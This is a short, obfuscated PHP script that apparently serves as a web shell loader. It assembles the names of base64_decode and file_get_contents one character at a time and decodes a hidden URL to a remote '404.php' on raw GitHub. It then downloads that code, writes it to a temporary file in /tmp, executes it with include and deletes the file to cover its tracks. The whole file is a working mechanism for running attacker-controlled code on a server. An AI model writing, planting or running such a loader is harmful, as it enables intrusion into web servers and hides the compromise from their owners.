<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);
$a='aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhdGFocGVsZWsvdy9tYWluLzQwNC5waHA=';
$b='b'.'a'.'s'.'e'.'6'.'4'.'_'.'d'.'e'.'c'.'o'.'d'.'e';
$c='f'.'i'.'l'.'e'.'_'.'g'.'e'.'t'.'_'.'c'.'o'.'n'.'t'.'e'.'n'.'t'.'s';
$e = $b($a);
$f = $c($e);
$tmp = '/tmp/temp_'.md5(time()).'.php';
file_put_contents($tmp, $f);
include $tmp;
unlink($tmp);
?>